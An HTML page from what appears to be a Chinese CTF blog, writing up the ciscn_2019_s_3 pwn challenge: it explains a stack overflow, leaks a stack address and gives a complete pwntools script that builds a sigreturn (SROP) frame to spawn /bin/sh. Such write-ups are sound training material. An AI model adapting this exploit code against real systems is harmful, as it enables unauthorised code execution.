@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>ciscn_2019_s_3 - Luexp</title><meta name="Description" content="Luexp&#39;s blog"><meta property="og:title" content="ciscn_2019_s_3" />
+<meta property="og:description" content="之前学习了SROP但是一直没有实践过，刚好这道题需要使用SROP才能利用，记录一下。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/ciscn-2019-s-3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-04-10T18:06:12+00:00" />
+<meta property="article:modified_time" content="2020-04-10T18:06:12+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ciscn_2019_s_3"/>
+<meta name="twitter:description" content="之前学习了SROP但是一直没有实践过，刚好这道题需要使用SROP才能利用，记录一下。"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/ciscn-2019-s-3/" /><link rel="prev" href="http://example.org/babyheap-0ctf-2017/" /><link rel="next" href="http://example.org/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ciscn_2019_s_3",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/ciscn-2019-s-3\/"
+        },"genre": "posts","keywords": "pwn, wp","wordcount":  669 ,
+        "url": "http:\/\/example.org\/ciscn-2019-s-3\/","datePublished": "2020-04-10T18:06:12+00:00","dateModified": "2020-04-10T18:06:12+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Luexp"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="GO!"> 文章 </a><a class="menu-item" href="/tags/" title="BIU!"> 标签 </a><a class="menu-item" href="/categories/" title="BOOM!"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="GO!">文章</a><a class="menu-item" href="/tags/" title="BIU!">标签</a><a class="menu-item" href="/categories/" title="BOOM!">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">ciscn_2019_s_3</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Luexp</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-04-10">2020-04-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 669 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#保护机制">保护机制</a></li>
+    <li><a href="#程序分析-1">程序分析</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a>
+      <ul>
+        <li><a href="#泄漏stack">泄漏stack</a></li>
+        <li><a href="#构造sgineraturn-frame">构造Sgineraturn frame</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#参考">参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>之前学习了SROP但是一直没有实践过，刚好这道题需要使用SROP才能利用，记录一下。</p>
+<h1 id="涉及知识">涉及知识</h1>
+<ul>
+<li>SROP</li>
+<li>syscall</li>
+</ul>
+<h1 id="程序分析">程序分析</h1>
+<h2 id="保护机制">保护机制</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/FaOn4zKNxZyWh19.png"
+        data-srcset="https://i.loli.net/2020/05/20/FaOn4zKNxZyWh19.png, https://i.loli.net/2020/05/20/FaOn4zKNxZyWh19.png 1.5x, https://i.loli.net/2020/05/20/FaOn4zKNxZyWh19.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/FaOn4zKNxZyWh19.png"
+        title="image-20200520113325566" /></p>
+<p>开启NX和部分RELRO</p>
+<h2 id="程序分析-1">程序分析</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/SUsvilxfMgPnh8e.png"
+        data-srcset="https://i.loli.net/2020/05/20/SUsvilxfMgPnh8e.png, https://i.loli.net/2020/05/20/SUsvilxfMgPnh8e.png 1.5x, https://i.loli.net/2020/05/20/SUsvilxfMgPnh8e.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/SUsvilxfMgPnh8e.png"
+        title="image-20200520113343460" /></p>
+<p>在vuln函数处，看起汇编代码可以知道第一个syscall调用的是read函数并读入0x400个字节数据到buf中，而buf距离rsp只有0x10所以这里存在栈溢出。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/Ya964GO7S28qyJ5.png"
+        data-srcset="https://i.loli.net/2020/05/20/Ya964GO7S28qyJ5.png, https://i.loli.net/2020/05/20/Ya964GO7S28qyJ5.png 1.5x, https://i.loli.net/2020/05/20/Ya964GO7S28qyJ5.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/Ya964GO7S28qyJ5.png"
+        title="image-20200520113355401" /></p>
+<p>gadget函数是将rax的值更改为15，而15是signerature的调用好，从这里可以猜测处出题人先考察的是SROP的知识。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>漏洞利用分为两步第一步是泄漏stack的值，第二步是调用execve('/bin/sh',0,0)</p>
+<h3 id="泄漏stack">泄漏stack</h3>
+<p>我们用gdb调试程序后观察到在rsp+0x8处存储了stack地址，而write的大小为0x30刚好可以把rsp+0x8处的地址给leak出来。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/TnEJNDGHz5t3qIA.png"
+        data-srcset="https://i.loli.net/2020/05/20/TnEJNDGHz5t3qIA.png, https://i.loli.net/2020/05/20/TnEJNDGHz5t3qIA.png 1.5x, https://i.loli.net/2020/05/20/TnEJNDGHz5t3qIA.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/TnEJNDGHz5t3qIA.png"
+        title="image-20200520113406954" /></p>
+<h3 id="构造sgineraturn-frame">构造Sgineraturn frame</h3>
+<p>这里就不详细介绍关于SROP的原理，详细的教程请移步参考链接。由于我们泄露了stack地址我们可以把/bin/sh字符串写到stack中，再构造execve系统调用的sgneraturn frame就可以获得shell。</p>
+<h1 id="exp">EXP</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python">
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./cis&#39;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+<span class="n">vuln_start</span><span class="o">=</span><span class="mh">0x00000000004004F1</span>
+<span class="n">syscall_ret</span><span class="o">=</span><span class="mh">0x0000000000400517</span>
+<span class="n">hint</span><span class="o">=</span><span class="mh">0x00000000004004DA</span>
+<span class="c1">#leack stack</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">vuln_start</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">stack_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">32</span><span class="p">:</span><span class="mi">40</span><span class="p">])</span><span class="o">-</span><span class="mh">0x100</span>
+
+<span class="c1">#make signal Frame and get shell</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">hint</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+<span class="n">sigframe</span><span class="o">=</span><span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span><span class="o">=</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span><span class="o">=</span><span class="n">stack_addr</span><span class="o">+</span><span class="mh">0x110</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span><span class="o">=</span><span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span><span class="o">=</span><span class="n">syscall_ret</span>
+<span class="n">payload</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="p">(</span><span class="mh">0x120</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">*</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">#gdb.attach(sh)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="反思">反思</h1>
+<p>想要利用SROP的话需要有足够大的溢出空间和system_ret以及修改rax的gadget，不过rax也可以通过read函数读入的个数来进行修改。总的来说感觉SROP是一个挺好玩的利用方法，利用的时候要注意恢复后rsp寄存器的值。</p>
+<h3 id="参考">参考</h3>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/" target="_blank" rel="noopener noreffer">SROP原理</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-04-10</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/ciscn-2019-s-3/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3" data-via="xx" data-hashtags="pwn,wp"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/ciscn-2019-s-3/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/ciscn-2019-s-3/" data-title="ciscn_2019_s_3"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/babyheap-0ctf-2017/" class="prev" rel="prev" title="babyheap_0ctf_2017"><i class="fas fa-angle-left fa-fw"></i>babyheap_0ctf_2017</a>
+            <a href="/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/" class="next" rel="next" title="修改程序为指定libc版本 &amp; pwndbg安装">修改程序为指定libc版本 &amp; pwndbg安装<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Luexp</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
